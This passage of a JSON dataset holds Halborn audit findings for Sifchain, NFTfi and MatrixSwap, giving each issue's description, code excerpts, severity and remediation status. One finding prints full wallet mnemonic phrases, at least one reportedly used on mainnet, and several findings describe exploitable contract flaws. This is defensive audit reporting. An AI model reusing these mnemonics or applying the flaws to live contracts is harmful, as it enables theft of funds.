        "body": "The Admin account is defined at genesis and there does not seem to be a mechanism to update the account. If the key is compromised it would be impossible to contain the attack without stopping the chain and deploying new code. This further amplifies the risk of HAL-01 because there is no containment mechanism in the case of a compromised key, and the only resulting possible solution is to halt all oracles and pause contracts to prevent fund transfers, assuming the funds have not already been moved. Code Location: Figure 1: Only reference to SetAdminAccount 18 The account being allocated can be seen in the genesis.json file: Listing 3: .sifnoded/config/genesis.json 193 194 195 196 \" oracle \" : { \" address_whitelist \" : null , \" admin_address \": \" sif1wy22rv4w3l9vmw5cvdc6npg8t0vess0kpvga3j \" }, Risk Level: Likelihood - 2 Impact - 2 Recommendations: Eliminate the Admin role and use governance. Remediation Plan: ACCEPTED RISK: The risk has been taken by the Sifchain Team. There are methods to upgrade the Genesis with a Network Upgrade. 19 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Low"
        ]
    },
    {
        "title": "ONLY ADMINS CAN ASSIGN ORACLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Medium"
        ]
    },
    {
        "title": "NETWORK CENTRALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Sifchain has stated that decentralization is an eventual goal, with a promise of transitioning to a DAO with full on-chain governance However, the chain has millions of dollars of assets post-Betanet. pegged right now. The network validator, oracle, and admin roles are almost entirely controlled by Sifchain. Eighty-six percent of the networks validator stake is controlled by Sifchain and assigned to nodes run by Sifchain. This not only gives the appearance of a centralized system, it also disincentives smaller validators from running nodes further contributing to the problem. It also appears that this centralization has been downplayed by modifying the BigDipper-based Sifchain block explorer to show a set of random validators where recently signed blocks would normally appear, giving the illusion of a more decentralized validator set. 21 Figure 2: Cosmos Big Dipper Shows Recent Blocks 22 Figure 3: Sifchain shows random validators instead 23 Risk Level: Likelihood - 2 Impact - 2 Recommendations: Despite running on a public blockchain and inviting validators to participate, validators and token holders have little power. The last governance proposals were immediately and solely approved by Sifchain-owned accounts.  Sifchain should reduce the amount of rowan staked to their validators. This could be done by transitioning to an incentive model, such as the Kusama Thousand Validator program, or even the Osmosis foundations delegation program, where funds are allocated to validators that fulfill certain requirements for uptime, governance participation or telemetry statistics.  There should be a minimum stake required for validators that is high enough to ensure quality validators are securing the network.  The size of the validator pool should be reduced if there are not sufficient validators to create competition for joining the active set. Remediation Plan: PARTIALLY FIXED: Sifchain retired the old block explorer entirely in favor of this 3rd party block explorer run by Cosmostation https://www.mintscan.io/sifchain. Sifchains foundation validators cannot earn any validator income as its all redistributed to the other validators, so the disincentivization issue is not an issue. That said, we agree the networks security comes from the foundations validators. Sifchain is considering a foundation delegation program with the following constraints: 24 1. Known validator that can sign a contract 2. Minimum self-delegation of some number of Rowan (not sure the amount yet) 3. Minimum 2% commission, maximum 10% commission 4. Not being slashed for not updating to a new node. 5. Bonus points based on content in Persistences program 25 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Low"
        ]
    },
    {
        "title": "ORACLES SIGN WITH VALIDATOR KEYS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The Oracle role is required to be a validator. While this may seem like a way to further restrict permissions it does not provide any additional protection. Sifchain only has seventy two active producers and the lowest self-bond is 1rowan which at the time of this report is $0.12 USD. Using the same key on both a Validator and Oracle increases the risk of the Oracle key being disclosed, especially if they are run on separate nodes. This also violates the principle of least privilege, and given the power Oracles wield reducing exposure should be a priority. Code Location: The following check enforces this behavior: Listing 5: x/staking/keeper/validator.go 26 func ( k Keeper ) mustGetValidator ( ctx sdk . Context , addr sdk . ValAddress ) types . Validator { validator , found := k . GetValidator ( ctx , addr ) if ! found { panic ( fmt . Sprintf ( \" validator record not found for address : % X\\ n \" , addr )) } return validator 27 28 29 30 31 32 33 } Risk Level: Likelihood - 2 Impact - 3 26 Recommendations: Authorization for oracle or bridge related actions and validators should use different roles. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 27 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Low"
        ]
    },
    {
        "title": "SENSITIVE INFORMATION IN ENVIRONMENT VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "When you store your secret keys in an environment variable, you are prone to accidentally exposing them. Code Location: Signature Go File Listing 6: cmd/ebrelayer/txs/signature.go 21 func LoadPrivateKey () ( key * ecdsa . PrivateKey , err error ) { 22 // Private key for validator 's Ethereum address must be set as an environment variable 23 24 rawPrivateKey := os . Getenv ( \" ETHEREUM_PRIVATE_KEY \" ) .... Risk Level: Likelihood - 3 Impact - 3 Recommendations: Given that the environment is implicitly available to the process, its hard, if not impossible, to track access and how the contents get exposed (ps -eww ). Its common to have applications grab the whole environment and print it out for debugging or error reporting. Environment variables are passed down to child processes, which allows for unintended access. Imagine that as part This breaks the principle of least privilege. of your application, you call to a third-party tool to perform some action---all of a sudden that third-party tool has access to your 28 When applications crash, its common for them to store environment. the environment variables in log-files for later debugging. This means plain-text secrets on disk. Remediation Plan: PENDING: Sifchain Team will fix it in a future release with a refactor of using options such as a Key Manager external to the environment such as HSM or Secrets Manager. They need to use an HSM to generate keys and AWS Secrets Manager to retrieve to address 06 29 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Medium"
        ]
    },
    {
        "title": "HARDCODED MNEMONIC PHRASES IN THE REPOSITORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the SifNode repository, it was discovered that there are multiple mnemonic phrases hardcoded in bash scripts. At least one of the keys have been in active use on both the Sifchain and Ethereum mainnets, in particular the sif account referenced below.  Sifchain Transactions  Ethereum Transactions Code Location: init.sh Listing 7: /scripts/init.sh (Lines ) 1 echo \" Generating deterministic account - sif \" 2 echo \" race draft rival universe maid cheese steel logic crowd fork comic easy truth drift tomorrow eye buddy head time cash swing swift midnight borrow \" | sifnodecli keys add sif -- recover 3 4 echo \" Generating deterministic account - akasha \" 5 echo \" hand inmate canvas head lunar naive increase recycle dog ecology inhale december wide bubble hockey dice worth gravity ketchup feed balance parent secret orchard \" | sifnodecli keys add akasha -- recover 6 sifchain_start_daemon.sh Listing 8: sifchain start daemon.sh (Lines ) 1 #{ \" name \" : \" fnord \" ,\" type \" :\" local \" ,\" address \": \" sif10ckfjtdmk9zkcs9fhl0h260xsj6kvg7esmyqrw \" ,\" pubkey \" :\" \" ,\" 30 mnemonic \" : \" exact below syrup slender party witness already lamp inform dash impose ginger sauce shift tag humble awkward spawn blue flower lab census gold girl \" } 2 Risk Level: Likelihood - 2 Impact - 3 Recommendations: Use secure vault to store credentials instead of using them hardcoded. It is recommended to delete mnemonic phrases from the Git Also, history, and change any previously used mnemonic phrases to prevent future incidents if these mnemonic phrases have been leaked, or reused elsewhere. Test scripts should dynamically create keys at runtime. Remediation Plan: ACCEPTED RISK: Sifchain Team claims that the mnemonic phrases used only for test purpose. 31 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Low"
        ]
    },
    {
        "title": "UNBOUNDED LOOPS ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "peggyTokens and distributionRecordsclass contain an iteration which does not have bound on the itself. If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.The program contains an iteration or loop with an exit condition that cannot be reached. Code Location: peggyTokens.go Listing 9: x/ethbridge/keeper/peggyTokens.go (Lines ) 23 .... 24 25 26 27 28 29 30 31 ... tokens := k . GetPeggyToken ( ctx ) for _ , value := range tokens { if value == token { return true } } return false distributionRecords.go Listing 10: https://github.com/Sifchain/sifnode/blob/d1ecf5449b7ffae9ae279fb1246844d6925d970a/x/dispensation/keeper/distributionRecords.go (Lines ) 214 func ( k Keeper ) GetRecords ( ctx sdk . Context ) types . DistributionRecords { var res types . DistributionRecords iterator := k . GetDistributionRecordsIterator ( ctx ) defer iterator . Close () for ; iterator . Valid () ; iterator . Next () { var dr types . DistributionRecord 215 216 217 218 219 32 220 221 222 223 224 225 } bytesValue := iterator . Value () k . cdc . MustUnmarshalBinaryBare ( bytesValue , & dr ) res = append ( res , dr ) } return res Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider implementing bounds on the functions. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 33 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Informational"
        ]
    },
    {
        "title": "RUN CONTAINER AS ROOT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Configuring the container to use an unprivileged user is the best way to prevent privilege escalation attacks. It is possible to run sifnode as a root via Docker. Sample Docker Image: Location: b9628ea5eebf41fd2ef7c7533f4022be2/deploy/docker/mainnet/docker- compose.yml#L6 https://github.com/Sifchain/sifnode/blob/9597894 Listing 11 1 FROM sifchain / sifnoded : mainnet - genesis 2 RUN addgroup -g 26656 sif && adduser -u 26656 -G sif -S -h / app sif && \\ 3 4 5 mkdir -p / app /. sifnoded / cosmovisor / genesis / bin / app /. sifnoded / cosmovisor / upgrades \\ / app /. sifnoded / config / app /. sifnoded / data && \\ mv / usr / bin / sifnoded / app /. sifnoded / cosmovisor / genesis / bin / && chown -R sif : sif / app 6 USER sif 7 WORKDIR / app 8 ENV PATH / usr / local / sbin :/ usr / local / bin :/ usr / sbin :/ usr / bin :/ sbin :/ bin :/ app /. sifnoded / cosmovisor / genesis / bin 9 Risk Level: Likelihood - 3 Impact - 2 34 Recommendations: One of the best practices while running Docker Container is to run processes with a non-root user. This is because if a user manages to break out of the application running as root in the container, an attacker may gain root user access on host. Remediation Plan: PENDING: Sifchain Team will fix it in a future release. 35 3.10 (HAL-10) UNSAFE RPC EXPOSED - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Informational"
        ]
    },
    {
        "title": "BUNDLES INSIDE IMMUTABLEBUNDLES CONTRACT CAN BE EXTRACTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "can lock their bundles Users or PersonalBundler contracts) by transferring them to the ImmutableBundle contract with the safeTransferFrom() function. This prevents users from extracting NFTs from the bundle right before taking a loan on them. NftfiBundler (created with the ImmutableBundle implements the rescueERC721() and rescueERC20() func- tions, which allow the owner account to retrieve ERC20 and ERC721 to- To prevent kens received in airdrops for the locked collateral NFTs. rescueERC721() function from extracting bundle tokens, a require state- ment checks the _tokenAddress value not to match the NftfiBundler or PersonalBundler contract addresses. However, it has been detected that, instead of _tokenAddress, msg.sender is checked to be a PersonalBundler token, which it cannot be, since this function can only be called by the owner of ImmutableBundle contract. This makes all PersonalBundler tokens extractable from the contract, incurring a loss of the bundled NFTs to the user. Code Location: Listing 1: ImmutableBundle.sol 276 277 /* * * @notice used by the owner account to be able to drain  ERC721 tokens received as airdrops 278 279 * for the locked * @param _tokenAddress - address of the token contract for collateral NFT -s  the token to be sent out 280 281 282 * @param _tokenId - id token to be sent out * @param _receiver - receiver of the token */ 16 283 284 285 286 287 288 289 290 291 function rescueERC721 ( address _tokenAddress , uint256 _tokenId , address _receiver ) external onlyOwner { IERC721 tokenContract = IERC721 ( _tokenAddress ); require ( _tokenAddress != address ( bundler ) && ! PersonalBundlerFactory ( personalBundlerFactory ).  personalBundlerExists ( msg . sender ) , 292 293 294 \" token is a bundle \" ); require ( tokenContract . ownerOf ( _tokenId ) == address ( this ) ,  \" nft not owned \" ); 295 tokenContract . safeTransferFrom ( address ( this ) , _receiver ,  _tokenId ); } 296 17 Proof of Concept: This PoC shows how User2 bundles NFTs 1, 2, and 3 with an instance of PersonalBundler, sends it to ImmutableBundle and then it gets successfully extracted with the rescueERC721() function: Risk Level: Likelihood - 2 Impact - 4 Recommendation: The rescueERC721() function should validate the _tokenAddress parameter instead of msg.sender to prevent personal bundles to be extracted. 18 Remediation Plan: instead of msg.sender. SOLVED: The NFTfi team solved the issue by validating _tokenAddress In addition, immutableOfBundle[_tokenId] or immutableOfPersonalBundler[_tokenAddress] are required to be 0, mean- ing that NftfiBundler or PersonalBundler tokens not associated to any immutable bundle can also be extracted, remediating HAL-02 issue. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 19 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISTAKENLY SENT BUNDLE TOKENS CAN NOT BE RESCUED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "can lock their bundles (created or Users PersonalBundler contracts) by transferring them to the ImmutableBundle contract with the safeTransferFrom() function. However, these contracts rely on users sending tokens to them with the appropriate functions (e.g., safeTransferFrom or getChild instead of transfer and transferFrom) to properly record those transactions. NftfiBundler with the The ImmutableBundle contract allows the admin to recover ERC721 tokens with the rescueERC721 function. However, this function does not allow rescuing NftfiBundler or PersonalBundler tokens; therefore, it is im- possible to recover bundles that were accidentally transferred with the wrong transfer functions (e.g., transfer or transferFrom). Code Location: Listing 2: ImmutableBundle.sol 276 277 /* * * @notice used by the owner account to be able to drain  ERC721 tokens received as airdrops 278 279 * for the locked * @param _tokenAddress - address of the token contract for collateral NFT -s  the token to be sent out 280 281 282 283 284 285 286 287 288 289 290 * @param _tokenId - id token to be sent out * @param _receiver - receiver of the token */ function rescueERC721 ( address _tokenAddress , uint256 _tokenId , address _receiver ) external onlyOwner { IERC721 tokenContract = IERC721 ( _tokenAddress ); require ( _tokenAddress != address ( bundler ) && 20 291 ! PersonalBundlerFactory ( personalBundlerFactory ).  personalBundlerExists ( msg . sender ) , 292 293 294 \" token is a bundle \" ); require ( tokenContract . ownerOf ( _tokenId ) == address ( this ) ,  \" nft not owned \" ); 295 tokenContract . safeTransferFrom ( address ( this ) , _receiver ,  _tokenId ); } 296 Proof of Concept: As a proof of concept, user2 bundles NFTs 1, 2, and 3 with NftfiBundler and transfers them to the ImmutableBundle contract with the transferFrom() function, which locks the bundle (and the NFTs contained in it) forever: 21 Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to modify the rescueERC721() function to also allow rescuing bundle tokens if they are not associated to any immutable bundle, meaning that they were transferred to the ImmutableBundle contract using the wrong methods. Remediation Plan: SOLVED: The NFTfi team solved the issue by requiring immutableOfBundle [_tokenId] or immutableOfPersonalBundler[_tokenAddress] to be 0, which means that NftfiBundler or PersonalBundler tokens not associated with no immutable bundle can be extracted. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 22 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Medium"
        ]
    },
    {
        "title": "POSSIBLE LOSS OF OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When transferring the ownership of the protocol, no checks are performed on whether the new address is valid and active. In case there is a mistake when transferring the ownership, the whole protocol may lose all of its ownership functionalities. Code Location: Listing 3: Ownable.sol * @dev Transfers ownership of the contract to a new account * Can only be called by the current owner . */ function transferOwnership ( address _newOwner ) public virtual require ( _newOwner != address (0) , \" Ownable : new owner is /* * 42 43  ( ` newOwner `) . 44 45 46  onlyOwner { 47  the zero address \" ); 48 49 } _setOwner ( _newOwner ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The transfer of ownership process should be split into two different transactions, the first one calling the requestTransferOwnership function which proposes a new owner for the protocol, and the second one, the new 23 owner accepts the proposal by calling acceptsTransferOwnership function. Remediation Plan: SOLVED: The NFTfi team solved the issue by implementing a two-step own- ership transfer process. Commit ID: 52f68e41a729e83f27c1cb747a464a2367132d5b 24 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Medium"
        ]
    },
    {
        "title": "SENDELEMENTSTOPERSONALBUNDLER(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users can call sendElementsToPersonalBundler() function to move every token inside a bundle to a personal bundle. This function uses a while loop to iterate through every childToken of every childContract until childContracts[_tokenId] and childTokens[_tokenId][childContrac] lengths are 0, meaning that no more child tokens are held in the bundle. However, if tokens are already in a personal bundle, and they are trans- ferred to the same bundle, or if they are in a NftfiBundler bundle with id = 1 and theyre being transferred to the same NftfiBundler bundle (the second scenario is less likely than the first one), the function runs into an infinite loop, since the lengths mentioned above will never decrease, keeping the while loop running until it spends the max amount of gas allowed for the call, reverting the state and incurring unnecessary cost to the user. Code Location: Listing 4: NftfiBundler.sol 130 131 /* * * @notice Remove all the children from the bundle and send to  personla bundler . 132 * If bundle contains a legacy ERC721 element , this will not  work . 133 * @dev This method may run out of gas if the list of children  is too big . In that case , children can be removed 134 135 136 individually . * * @param _tokenId the id of the bundle * @param _personalBundler address of the receiver of the 25  children 137 138 */ function sendElementsToPersonalBundler ( uint256 _tokenId ,  address _personalBundler ) external { 139 140 141 142 143 144 _validateReceiver ( _personalBundler ); _validateTransferSender ( _tokenId ); // fix this actual personalBundlerExists require ( IERC165 ( _personalBundler ). supportsInterface ( type (  IERC998ERC721TopDown ). interfaceId ) , 145 146 147 148 149 \" has to implement IERC998ERC721TopDown \" ); uint256 personalBundleId = 1; // make sure sendeer owns personal bundler token require ( IERC721 ( _personalBundler ). ownerOf ( personalBundleId  ) == msg . sender , \" has to own personal bundle token \" ); 150 151 // In each iteration all contracts children are removed ,  so eventually all contracts are removed 152 153  ; 154 155 while ( childContracts [ _tokenId ]. length () > 0) { address childContract = childContracts [ _tokenId ]. at (0) // In each iteration a child is removed , so eventually  all contracts children are removed 156  0) { 157 while ( childTokens [ _tokenId ][ childContract ]. length () > uint256 childId = childTokens [ _tokenId ][  childContract ]. at (0) ; 158 159 160 161 162 163 164 165 166 167 168 169 _removeChild ( _tokenId , childContract , childId ); try IERC721 ( childContract ). safeTransferFrom ( address ( this ) , _personalBundler , childId , abi . encodePacked ( personalBundleId ) ) { // solhint - disable - previous - line no - empty -  blocks 170 } catch { 26 171 172 173 revert (\" only safe transfer \"); } emit TransferChild ( _tokenId , _personalBundler ,  childContract , childId ); 174 175 176 } } } Proof of Concept: user2 bundles NFTs 1, 2, and 3 with the As a proof of concept, From there, the NFTs are being transferred to NftfiBundler contract. the user2s personal bundler with the sendElementsToPersonalBundler() function, and then they are transferred again to the same personalbundle. This makes the sendElementsToPersonalBundler() function to run into an infinite loop, which ends up with crashing the test environment. 27 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to check that tokens are not sent to the same contract (with a require statement that ensures that _personalBundler != address (this)). 28 Remediation Plan: SOLVED: The NFTfi team solved the issue by preventing sendElementsToPersonalBundler () from being called with msg.sender as the _personalBundler address. Commit ID: 478ae0542a50367defd1f39047f418806205f7aa 29 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Low"
        ]
    },
    {
        "title": "ADD OR REMOVE BUNDLE ELEMENTS FUNCTIONS MAY RUN OUT OF GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users can use functions to add or remove multiple NFTs at the same time in the NftfiBundler or PersonalBundler contracts. These functions can have high gas costs based on the number of tokens transferred. Adding elements also calls an external validator contract to check whether the asset is permitted or not, further increasing the gas cost. Many users use wallets with default gas limit configured. When the limit is reached, the users lose a significant amount of Ether in those failed transactions. The affected functions: NftfiBundler.sol  buildBundle  addBundleElements  removeBundleElements  addAndRemoveBundleElements  decomposeBundle  sendElementsToPersonalBundler Risk Level: Likelihood - 2 Impact - 2 30 Recommendation: It is recommended to limit the number of tokens that can be transferred in a single transaction after careful testing or at least inform the users beforehand that if they use the affected functions with many tokens, they should change the default gas limit. Remediation Plan: In RISK ACCEPTED: The NFTfi team accepted the risk of this finding. addition, gas limit and maximum bundle size checks will be implemented in the front-end. 31 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PARAMETER VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "childContractByIndex functions The ERC998TopDown contract did not validate their parameters. invalid values may result in reverts without error messages. childTokenByIndex and the of Setting The contracts/NftfiBundler.sol: constructor - _permittedNfts parameter is not a zero address. - not _airdropFlashLoan parameter is not a zero address. constructor contract contract does does the The the not of of validate that the validate that the contracts/ImmutableBundle.sol: - The constructor of the contract does not validate that the _bundler parameter is not a zero address. - the _personalBundlerFactory parameter is not a zero address. constructor contract validate does that the not The of contracts/PersonalBundlerFactory.sol: - _personalBundlerImplementation parameter is not a zero address. constructor validate contract does not the The of that the contracts/ERC998TopDown.sol: - The childContractByIndex function does not validate that the _index parameter is a valid index. - The childTokenByIndex function does not validate that the _index pa- rameter is a valid index. contracts/utils/Ownable.sol: - The constructor of the contract does not validate that the _initialOwner parameter is not a zero address. 32 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate the listed parameters to prevent contract misconfiguration and reverts without error messages. Remediation Plan: RISK ACCEPTED: The NFTfi team accepted the risk of this finding. 33 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF INLINE ASSEMBLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Inline assembly is a way to access the Ethereum Virtual Machine at a low level. This discards several important safety features of Solidity and the static compiler. Because the EVM is a stack machine, it is often hard to address the correct stack slot and provide arguments to opcodes at the correct point on the stack. Soliditys inline assembly tries to facilitate that and other issues arising when writing manual assembly. Assembly is much more difficult to write because the compiler does not perform checks, so the contract developer should be aware of this warning. Code Location: Listing 5: ERC998TopDown.sol 127 assembly { 128 parentTokenOwner := or ( ERC998_MAGIC_VALUE ,  parentTokenOwnerAddress ) 129 } Listing 6: ERC998TopDown.sol 184 assembly { 185 186 } rootOwner := or ( ERC998_MAGIC_VALUE , rootOwnerAddress ) Listing 7: ERC998TopDown.sol 475 assembly { 476 477 } tokenId := mload ( add ( _data , 0 x20 )) 34 Risk Level: Likelihood - 1 Impact - 2 Recommendation: When possible, do not use inline assembly because it is a manner to access to the EVM (Ethereum Virtual Machine) at a low level. An attacker could bypass many important safety features of Solidity. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 35 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOOP GAS USAGE OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple gas cost optimization opportunities were identified in the loops of the NftfiBundler contract:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas than <.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Loop counters do not need to be set to 0, since uint256 is already initialized to 0. Code Location: contracts/NftfiBundler.sol - Line 180 for (uint256 i = 0; i < _bundleElements.length; ++i){ - Line 193 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ - Line 192 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ - Line 204 for (uint256 i = 0; i < _bundleElements.length; ++i){ - Line 206 for (uint256 j = 0; j < _bundleElements[i].ids.length; ++j){ contracts/PermittedNFTs.sol - Line 120 for (uint256 i = 0; i < _nftContracts.length; ++i){ Risk Level: Likelihood - 2 Impact - 1 36 Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. It is recommended to use the unchecked ++i operation to increment the It is noted that using values of the uint variable inside the loop. unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != instead of < in the exit conditions. The following code is an example of the above recommendations: Listing 8 1 uint256 bundleLength = _bundleElements . length ; 2 for ( uint256 i ; i != bundleLength ; ++ i) { 3 Remediation Plan: SOLVED: The NFTfi team implemented the recommended gas optimizations. Commit ID: d93033e7d122168797981dfbd439374fbe5d4dd2 37 ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "SOLC 0.8.4 COMPILER VERSION CONTAINS MULTIPLE BUGS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Bundles_Airdrop_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The scoped contracts have configured the fixed pragma set to 0.8.4. The latest solidity compiler version, 0.8.17, fixed important bugs in the compiler along with new native protections. The current version is missing the following fixes: 0.8.5, 0.8.6, 0.8.7, 0.8.8, 0.8.9, 0.8.12, 0.8.13, 0.8.14, 0.8.15, 0.8.16, 0.8.17. The official Soliditys recommendations are that you should use the latest released version of Solidity when deploying contracts. Apart from exceptional cases, only the newest version receives security fixes. Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to use the latest Solidity compiler version as possible. Remediation Plan: SOLVED: The NFTfi team bumped the Solidity compiler version to 0.8.17. Commit ID: faa56c0d56293a7a43008a4c2f4f2500ba131cbf 38 3.10 (HAL-10) SPLITTING REQUIRE() STATEMENTS THAT USES AND OPERATOR SAVES GAS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "NFTfi_Bundles_Airdrop",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNCHECKED TRANSFERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract MatrixStaking the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. Checking the return value is also considered a best practice. Code Location:  Line 45: matrix.transferFrom(msg.sender, address(this), _amount);  Line 56: matrix.transfer(msg.sender, what); Risk Level: Likelihood - 2 Impact - 3 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: The MatrixSwap team now uses the SafeERC20 library to perform all token transfers. 13 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "UNUSED RETURNS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of some external calls are not stored in a local or state variable. In the contract MatrixStaking there is an instance where an external method is being called, and the return values are ignored. Code Location:  Line 25: IERC20(usdc).approve(address(uniswapV2Router), uint256(-1)); Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add a return value check to avoid an unexpected crash of the contract. Remediation Plan: RISK ACCEPTED: The MatrixSwap team accepted this risk of this finding. 14 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The constructor of the MatrixStaking contract is missing address validation. Every address should be validated and checked that is different from zero. This is also considered a best practice. Code location: Listing 1: MatrixStaking.sol (Line 23) 22 constructor ( IERC20 _matrix ) public { 23 24 25 26 } matrix = _matrix ; minSwapAmount = 1000000000; // 1000 usdc IERC20 ( usdc ). approve ( address ( uniswapV2Router ) , uint256 ( -1) ); Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: RISK ACCEPTED: The MatrixSwap team accepted this risk of this finding. 15 ",
        "labels": [
            "Halborn",
            "MatrixSwap_Staking",
            "Severity: Low"
        ]
    },
    {
        "title": "STATE VARIABLES MISSING CONSTANT MODIFIER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
